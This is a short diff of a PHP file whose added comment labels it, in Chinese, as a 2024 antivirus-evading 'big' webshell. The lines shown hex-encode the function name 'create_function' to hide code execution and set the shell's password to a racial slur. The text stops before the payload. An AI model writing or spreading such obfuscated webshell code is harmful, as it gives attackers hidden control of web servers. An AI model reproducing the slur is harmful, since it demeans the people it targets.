@@ -1,4 +1,5 @@
 <?php
+//2024最新免杀大马
 error_reporting(E_ALL ^ (E_NOTICE | E_WARNING | E_DEPRECATED));
 $mix="\x63\x72\x65\x61\x74\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e";
 $password = "nigger";
